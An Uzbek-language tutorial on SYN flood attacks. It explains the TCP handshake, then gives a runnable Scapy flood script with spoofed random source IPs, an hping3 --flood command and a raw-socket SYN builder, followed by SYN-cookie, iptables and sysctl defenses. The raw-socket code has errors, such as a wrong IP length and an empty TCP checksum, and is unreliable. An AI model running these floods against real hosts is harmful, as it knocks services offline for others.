# SYN Flood

TCP Handshake'dan foydalanib server resurslarini tugatish hujumi.

---

## TCP Handshake eslatma

```text
Normal:
Client → SYN → Server
Client ← SYN-ACK ← Server
Client → ACK → Server
Ulanish ochildi ✓
```

---

## SYN Flood qanday ishlaydi?

```text
Hujumchi:
Client → SYN → Server
Client → SYN → Server
Client → SYN → Server
... (minglab SYN)

Server:
- Har bir SYN uchun resurs ajratadi
- SYN-ACK yuboradi
- Kutadi (half-open connection)
- Resurslar tugaydi ❌
```

---

## ⚠️ Ogohlantirish

**Faqat o'z tarmog'ingizda sinang!**

Ruxsatsiz SYN flood:
- JINOYAT
- Tizimlarni ishdan chiqaradi
- Faqat o'rganish uchun

---

## Amaliy hujum (o'rganish uchun)

### Scapy yordamida SYN Flood

```python
from scapy.all import *
import random

def syn_flood(target_ip, target_port, count=1000):
    """SYN Flood - faqat o'z tarmog'ingizda sinang!"""
    
    print(f"[*] SYN Flood boshlandi: {target_ip}:{target_port}")
    print(f"[*] {count} ta paket yuboriladi")
    print("⚠️  CTRL+C to'xtatish uchun")
    
    sent = 0
    for i in range(count):
        try:
            # Tasodifiy manzil
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            
            # SYN paket yaratish
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(
                sport=src_port,
                dport=target_port,
                flags="S",  # SYN flag
                seq=random.randint(1000, 999999)
            )
            
            # Yuborish
            send(ip_layer/tcp_layer, verbose=False)
            sent += 1
            
            if sent % 100 == 0:
                print(f"[*] Sent {sent}/{count}")
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")
            break
    
    print(f"[*] Tugadi. Jami: {sent} paket yuborildi")

# Ishlatish (faqat o'z tarmog'ingizda!)
# syn_flood("192.168.1.100", 80, 100)
```

### hping3 yordamida

```bash
# SYN flood
sudo hping3 -S -p 80 --flood 192.168.1.100

# Parametrlar:
# -S = SYN flag
# -p 80 = port 80
# --flood = tez yuborish
```

### TCP SYN yuborish (raw socket)

```python
import socket
import struct
import random

def create_syn_packet(src_ip, dst_ip, src_port, dst_port):
    """SYN paket yaratish"""
    
    # IP header
    ip_header = struct.pack('!BBHHHBBH4s4s',
        0x45,  # Version, IHL
        0,     # DSCP, ECN
        20,    # Total Length
        random.randint(1, 65535),  # Identification
        0,     # Flags, Fragment Offset
        64,    # TTL
        6,     # Protocol (TCP)
        0,     # Checksum (kernel qo'shadi)
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip)
    )
    
    # TCP header
    tcp_header = struct.pack('!HHIIBBHHH',
        src_port,
        dst_port,
        random.randint(1, 4294967295),  # Sequence Number
        0,     # Acknowledgement
        (5 << 4),  # Data Offset
        0x02,  # Flags (SYN)
        65535, # Window
        0,     # Checksum
        0      # Urgent Pointer
    )
    
    return ip_header + tcp_header

# Ishlatish
src_ip = "192.168.1.100"  # O'z IP (spoofed)
dst_ip = "192.168.1.1"    # Target
src_port = random.randint(1024, 65535)
dst_port = 80

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
packet = create_syn_packet(src_ip, dst_ip, src_port, dst_port)
sock.sendto(packet, (dst_ip, 0))
```

---

## Himoya

### 1. SYN Cookies

```text
SYN Cookies = Server resurs ajratmaydi

1. SYN keladi
2. Server: cookie yaratadi (mavjud emas)
3. SYN-ACK yuboradi (cookie bilan)
4. ACK keladi → cookie tekshiriladi
5. Faqat to'g'ri cookie bo'lsa connection ochiladi
```

### 2. Rate Limiting

```bash
# iptables
sudo iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP
```

### 3. Firewall

```bash
# Nginx
# syncookies yoqish (Linux kernel)
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Half-open connection limit
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048
```

### 4. Monitoring

```bash
# TCP ulanishlarni kuzatish
ss -tan state syn-recv | wc -l

# Agar juda ko'p bo'lsa → SYN flood
```

---

## Xulosa

- SYN Flood TCP handshake dan foydalanadi
- Half-open connection lar resursni tugatadi
- SYN Cookies, Rate Limiting, Firewall bilan himoya
